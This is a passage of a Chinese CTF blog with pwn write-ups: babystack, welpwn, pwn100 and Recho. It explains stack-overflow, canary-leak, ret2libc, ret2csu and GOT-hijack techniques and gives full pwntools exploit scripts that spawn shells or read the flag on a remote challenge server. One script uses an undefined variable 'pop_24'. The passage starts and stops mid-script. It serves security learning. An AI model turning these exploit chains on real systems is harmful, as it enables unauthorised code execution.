class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br> <br>elf = ELF(<span class="hljs-string">&quot;./babystack&quot;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41209&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./babystack&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>execve = <span class="hljs-number">0x45216</span><br>main_addr = <span class="hljs-number">0x400908</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]           <span class="hljs-comment">#获取put的got表地址</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]           <span class="hljs-comment">#获取put的plt表地址</span><br>pop_rdi = <span class="hljs-number">0x0400a93</span><br> <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendline(payload)                  <span class="hljs-comment">#先输入0x88个a使put()能够泄露出canary的值</span><br> <br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)<br> <br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))   <span class="hljs-comment">#因为末尾的\n会覆盖末尾的\00</span><br> <br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br> <br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.send(payload1)             <span class="hljs-comment">#泄露出put()的真实地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>puts_addr=u64(p.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#读取到\x00停止</span><br><br>execve_addr = puts_addr - (libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>] - execve)   <span class="hljs-comment">#使用相对偏移来计算execve的真实地址</span><br><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> +  p64(execve_addr)  <span class="hljs-comment">#覆盖返回值为execve的真实地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendline(payload2)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-welpwn-泄露write函数地址构建rop链接"><a class="markdownIt-Anchor" href="#攻防世界-pwn-welpwn-泄露write函数地址构建rop链接"></a> 攻防世界-pwn-welpwn-泄露write函数地址构建rop链接</h1><p>1.先检查程序，只开启了nx</p>  <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115205088.png" alt="image-20210413115205088" style="zoom:67%;">                <p>2.用ida打开程序进行分析，主函数如下</p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115228251.png" alt="image-20210413115228251" style="zoom:67%;"><p>主函数会调用一个叫echo的函数，把输入buf传入，echo函数如下</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115252303.png" alt="image-20210413115252303" style="zoom:67%;"><p>此函数把传入的字符串依次复制给局部变量s2，直到0停止，注意到这里s2只有16个长度，可能会存在溢出，但是因为这里遇到\00会停止循环，不能直接构造rop链</p><p>通过调试，输入24个A的内存空间如下</p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115320597.png" alt="image-20210413115320597" style="zoom:67%;"><p>这两个栈是连续的，可以看成是这样的结构</p><p>0x10  s2  A * 16      0x38 buf  A * 8</p><p>0x18  s2  A*8       0x40 返回地址？</p><p>0x28    返回地址</p><p>0x30 buf  A*16</p><p>思路：首先我们输入的地址里不能存在\00，否则就不能读入到s2，因为栈是连续的，如果想要执行我们构造的rop链，就得跳过前面输入的0x18个长度的数据，可以寻找一个存在4个pop指令的地址，如下图0x40089c的位置就有4个连续的pop指令</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214630486.png" alt="image-20210413214630486"></p><p>这样我们可以构造这样的栈空间,就可以执行我们需要的函数了</p><p>0x10  s2  A*16      0x38 buf  A*8</p><p>0x18  s2  A*8       0x40 pop_4</p><p>0x28    pop_4      0x48 pop_rdi</p><p>0x30 buf  A*16      0x50 got</p><p>此题我们开始没有给出libc的版本，所以我们先泄露write的地址，先找到一个pop_rdi的地址为0x4008a3</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115639822.png" alt="image-20210413115639822" style="zoom:67%;"><p>先写出一个泄露write地址的脚本，便于判断libc版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41584&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./welpwn&#x27;</span>)  <br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_4=<span class="hljs-number">0x40089c</span><br>pop_rdi=<span class="hljs-number">0x4008a3</span><br>main_addr = <span class="hljs-number">0x4007CD</span><br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to RCTF\n&quot;</span>,payload1)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\x40&#x27;</span>)  <br><span class="hljs-comment">#泄露write地址  </span><br>write_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%write_addr)<br><br></code></pre></td></tr></table></figure><p>得到write的地址为0x7f0e5b3c72b0，用后三位2b0查找libc的版本可以知道是2.23</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214825951.png" alt="image-20210413214825951"></p><p>最后构建payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41584&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./welpwn&#x27;</span>)  <br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_4=<span class="hljs-number">0x40089c</span><br>pop_rdi=<span class="hljs-number">0x4008a3</span><br>main_addr = <span class="hljs-number">0x4007CD</span><br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr) <br><span class="hljs-comment">#构建put函数的rop链，泄露write函数的地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to RCTF\n&quot;</span>,payload1)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\x40&#x27;</span>)  <br><span class="hljs-comment">#获取write地址  </span><br>write_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%write_addr)<br><br>libc=ELF(<span class="hljs-string">&quot;libc6_2.23.so&quot;</span>)<br>libc_write=libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]   <br>libc_system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>libc_binsh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-comment">#获取libc的基地址，用得到的write地址减去libc里write的地址</span><br>libc_base = write_addr - libc_write<br><span class="hljs-comment">#获取system地址  </span><br>system_addr = libc_base + libc_system  <br><span class="hljs-comment">#获取/bin/sh地址  </span><br>binsh_addr = libc_base + libc_binsh  <br><br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)  <br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)<br><span class="hljs-comment">#构建rop链，执行system（/bin/sh）</span><br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-pwn100-3个参数的万能rop链"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn100-3个参数的万能rop链"></a> 攻防世界-pwn-pwn100-3个参数的万能rop链</h1><p>1.首先检查程序，只开启了nx保护</p><p>​                     <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214930924.png" alt></p><p>2.使用ida进行分析</p><p>主函数</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214955997.png" alt="image-20210413214955997" style="zoom:67%;"><p>Sub_40068E()</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215015084.png" alt="image-20210413215015084" style="zoom:67%;"><p>Sub_40063D()</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215033863.png" style="zoom:67%;"><p>可以看出这是一个for循环，每次都向v1的位置读取输入1个字节，i不能超过200</p><p>这里查看v1的栈空间只有0x40，可以进行栈溢出</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215105959.png" alt="image-20210413215105959" style="zoom:67%;"><p>再查看函数，存在puts和read，可以进行泄露，由于没有/bin/sh，所以我们得寻找一个数据段进行写入，用gdb查看内存段权限，发现0x00600e10到   0x00601068是可以进行读写的。</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215131810.png" alt="image-20210413215131810" style="zoom:67%;"><p>然后继续用ida查看此内存段，发现0x00600e10到0x601068处可以进行写入，用ida查看此处，发现在0x601040处有数据段可以使用此地址写入/bin/sh</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215149078.png" alt="image-20210413215149078" style="zoom:67%;"><p>我们可以使用程序中的read函数进行写入，read函数有3个参数，这时我们需要一个万能的Gadget进行传参，教程如https://xz.aliyun.com/t/5597，如下图，此程序中也存在__libc_csu_init()这样的函数</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215216727.png" alt="image-20210413215216727" style="zoom:67%;"><p>如图，先从 0x40075A 开始执行，将 rbx/rbp/r12/r13/r14/r15 这六个寄存器全部布置好，再 ret 到 0x400740 ，继续布置 rdx/rsi/rdi，最后通过 call qword ptr[r12+rbx*8] 执行目标函数。</p><p>这个通用 Gadget 好用的地方在于，不仅可以通过函数地址的指针（通常会用记录库函数真实地址的 got 表项）来控制目标函数，还可以控制目标函数的最多三个入参（rdi/rsi/rdx）的值。此外，只要设置 rbp=rbx+1而且栈空间足够，这个 Gadget 可以一直循环调用下去。栈的结构类似下图（原网页的图，第一个0x40061A对应该程序的0x40075A，0x400600对应该程序的0x400740.）</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215235442.png" alt="image-20210413215235442" style="zoom:67%;"><p>所以这里可以使用这个gadget构建read函数向.bss段写入/bin/sh</p><p>由于是64位程序，还要找到一个pop rdi的地址是0x400763</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215305789.png" alt="image-20210413215305789" style="zoom:67%;"><p>Payload脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;./pwn-100&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn-100&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;37423&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400763</span><br>pop_6 = <span class="hljs-number">0x040075A</span><br>mov_3 = <span class="hljs-number">0x0400740</span><br>start = <span class="hljs-number">0x0400550</span><br><br><span class="hljs-comment">#构造rop链，泄露puts函数真实地址</span><br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)<br>payload1 = payload1.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~\x0a&#x27;</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#把接收末尾的\0a替换为\00</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br><br><span class="hljs-comment">#用偏移量计算程序中的地址</span><br>libc_puts=libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br><br><span class="hljs-comment">#用read函数向0x601040写入</span><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_6) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(read_got) + p64(<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x601040</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#Gadget 需要布置六个寄存器（rbx/rbp/r12/r13/r14/r15）加一个 ret 返回地址，x64 下至少需要 56 个字节的栈空间</span><br><span class="hljs-comment">#所以mov_3之后的需要56个字节才能到返回到start</span><br>payload2 += p64(mov_3) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(start) <br>payload2 = payload2.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload2)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~\n&#x27;</span>)<br><span class="hljs-comment">#写入/bin/sh</span><br>p.send(<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><br><span class="hljs-comment">#构造rop链进行getshell</span><br>payload3 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(<span class="hljs-number">0x601040</span>) + p64(system_addr) <br>payload3 = payload3.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload3)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-recho-构造系统调用劫持got表"><a class="markdownIt-Anchor" href="#攻防世界-pwn-recho-构造系统调用劫持got表"></a> 攻防世界-pwn-Recho-构造系统调用劫持got表</h1><p>1.首先看一下程序的保护机制，只开启了NX保护</p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220457874.png" alt="image-20210413220457874" style="zoom:67%;">              <p>2.然后使用ida分析 ，主函数如下</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220516158.png" alt="image-20210413220516158" style="zoom:67%;"><p>可以看出，程序会先读取我们输入的数字，然后我们输入这个长度的字符串，然后程序会进行输出，然后我们注意到字符串里有一个flag，可能之后会用到</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220534899.png" alt="image-20210413220534899" style="zoom:67%;"><p>首先我们要考虑的是结束主函数的循环，pwntools里有一个shutdown的功能，可以用这个功能结束循环，但是就不能重新rop到主函数进行获取输入了，我们必须一次性完成所有操作。</p><p>由于要一次性完成操作，所以不能用之前的泄露地址的方法，这里因为数据段中存在flag，像open，write，read，alarm之类函数都存在系统调用（syscall）所以我们可以利用这个，可以直接抓取flag然后打印出来</p><p>故我们需要构造一个这样的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>,READONLY); <br><span class="hljs-built_in">read</span>(fd,buf,<span class="hljs-number">100</span>); <br><span class="hljs-built_in">printf</span>(buf); <br></code></pre></td></tr></table></figure><p>用gdb动态调试时对alarm进行分析</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220620011.png" alt="image-20210413220620011" style="zoom:67%;"><p>偏移为5的位置存在syscall,所以我们要进行劫持got表，首先我们得用</p><p>ROPgadget找到几个需要用到的构造代码</p><p>1.pop_rdi_ret=0x4008a3</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220641797.png" alt="image-20210413220641797" style="zoom:67%;"><p>2.pop_rax_ret=0x4006fc</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220701351.png" alt="image-20210413220701351" style="zoom:67%;"><p>3.add_rdi_ret = 0x40070d</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/C:%5CUsers%5C17473%5CDesktop%5C%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%5Cmakedown%5Cimage-20210413220732971.png" alt="image-20210413220732971"></p><p>所以劫持alarm的got表的构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># alarm() ---&gt; syscall</span><br><span class="hljs-comment"># alarm_got = alarm_got + 0x5</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><span class="hljs-comment"># rdi = alarm_got</span><br>payload += p64(pop_rdi_ret) + p64(alarm_got)<br><span class="hljs-comment"># rax = 0x5</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">0x5</span>)<br><span class="hljs-comment"># [rdi] = [rdi] + 0x5 </span><br>payload += p64(add_rdi_ret)<br></code></pre></td></tr></table></figure><p>第二步：构造fd = open(“flag”,READONLY)，由于open的系统调用号为2，所以把rax设置为2后调用syscall即可调用open()，ida中flag的地址为0x601058</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220815449.png" alt="image-20210413220815449" style="zoom:67%;"><p>还需要一个pop_rsi_ret = 0x4008a1</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220835212.png" alt="image-20210413220835212"></p><p>所以构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fd = open(&quot;flag&quot; , 0)</span><br><span class="hljs-comment"># rdi = &amp;&quot;flag&quot;</span><br>payload += p64(pop_rdi_ret) + p64(flag)<br><span class="hljs-comment"># rsi = 0 (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rax = 2</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># open(&quot;flag&quot; , 0)</span><br>payload += p64(alarm_plt)<br><br></code></pre></td></tr></table></figure><p>第三步：构造read(fd,buf,100)，可以直接把flag文件打开，并且存放到一个可以读写的位置，因为.bss段是可以读写的，所以我们需要一个地址存储读出来的flag，这里我们选择buf=0x601068</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220907110.png" alt="image-20210413220907110" style="zoom:67%;"><p>还需要一个pop_rdx_ret = 0x4006fe</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220925801.png" alt="image-20210413220925801" style="zoom:67%;"><p>所以构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># read(fd, buf, 100)</span><br><span class="hljs-comment"># rdi = 3 打开一个文件</span><br>payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># rsi = buf (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(buf) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rdx = 100</span><br>payload += p64(pop_rdx_ret) + p64(<span class="hljs-number">100</span>)<br><span class="hljs-comment"># read(3, buf, 100)</span><br>payload += p64(read_plt)<br>第四步：构造printf(buf)<br><span class="hljs-comment">#print flag</span><br><span class="hljs-comment"># rdi = buf</span><br>payload += p64(pop_rdi_ret) + p64(buf)<br><span class="hljs-comment"># printf(buf)</span><br>payload += 